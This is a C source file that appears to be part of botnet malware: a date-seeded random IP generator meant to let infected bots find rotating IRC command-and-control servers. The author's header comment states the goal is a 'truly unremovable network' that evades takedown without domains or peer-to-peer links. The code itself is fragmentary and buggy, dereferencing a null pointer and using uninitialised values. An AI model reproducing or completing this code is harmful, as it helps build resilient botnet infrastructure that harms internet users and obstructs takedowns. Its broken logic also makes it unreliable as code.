/*
bot ip generator
allows bots to 'synchronize' ip scans for things like c&c
they will scan for, and connect to 5 random irc servers relating to the current date
to obtain new bot links, and can move on so the irc servers wont get shutodwn
it gives infinite ability for bots to continously reconnect without a domain, p2p, email, contact, phone number etc..
and the bots themselves can open a base irc server as well and distribute the private messages via botlink

i believe this is, and using other already existing wide spread internet protocols is the onlt way to have a truly unremovable network

i'll clean this up, rewrite it and put into the module

generates 99% unique IP addresses with 1 million IPs.. i checked 10million and i believe it could be down to 95% but thats fine

*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <time.h>
#include "ipgen.h"
#include "list.h"

static uint32_t myrand_next = 1;

int myrand(void) {
    myrand_next = myrand_next * 1103515245 + 12345;
    return (uint32_t)(myrand_next >> 16) & 0xffffffff;
}

void mysrand(unsigned int seed) {
    myrand_next = seed;
}

// linked list for keeping states of the IP generator
IPGeneratorConfig *gen_list = NULL;

// retrieve or create a structure to keep the state of the generator for a particular ID
IPGeneratorConfig *IPGenConfigGet(int id, int seed) {
    IPGeneratorConfig *iptr = gen_list;

    // attempt to find the ID first..    
    while (iptr != NULL) {
        if (iptr->id == id)
            break;
            
        iptr = iptr->next;
    }

    // if it doesnt exist.. then create it!
    if (iptr == NULL) {
        if ((iptr = (IPGeneratorConfig *)L_add((LIST **)&gen_list, sizeof(IPGeneratorConfig))) != NULL) {
            iptr->id = id;
            iptr->seed = seed;
        }
    }

    return iptr;
}

// generate an 
uint32_t IPGenerateAlgo(int id, int seed) {
    int i = 0;
    int use[4];
    int z = 0;//, _catch_up = 0;
    uint32_t final = 0;
    char *raw = (char *)&final;
    struct sockaddr_in dst;
    IPGeneratorConfig *params = IPGenConfigGet(id, seed);
    int a = 0, b = 0, c = 0, d = 0;

    if (params == NULL)
        mysrand(params->seed);
    else
        mysrand(time(0)+myrand()%0x0000ffff);
    
    // we want to catch up (to get the state the same due to random seed being used elsewhere in the application)
    // and then we want to add 1 so that it generates a new IP
    //_catch_up = params->current_count + 1;
    
    //for (z = 0; z < _catch_up; z++) {
        if (params->current == 0) {
            // generate a random IP using the seed
            params->current = (myrand() % 0xffffffff);
        } else {
            // generate a new random IP using particulars
            a = 1 + (myrand() % 254);
            b = (255 - (myrand() % 254));
            c = 1 + (myrand() % 254);
            d = 1 + (myrand() % 254);
        }

        // use those prior numbers to modify particular portions of the IP address to generate a new one
        raw[0] = ((params->current & 0xff000000) + params->x[0]++) % a;
        raw[1] = ((params->current & 0x00ff0000) + params->x[1]++) % b;
        raw[2] = ((params->current & 0x0000ff00) + params->x[2]++) % c;
        raw[3] = ((params->current & 0x000000ff) + params->x[3]++) % d;

        // ensure nothing is .0 (if so, add 2).. *** maybe change this to 1 instead of 1 (might miss some routers)
        for (i = 0; i < 4; i++) if (raw[i] == 0) raw[i] = 2; 
        
        // keep the current count.. so we can catch up to it later..
        params->current_count++;
    //}

    // set the IP in the structure
    //dst.sin_addr.s_addr = final;
    
    //printf("ip: %s\n", inet_ntoa(dst.sin_addr));
    
    return final;
}
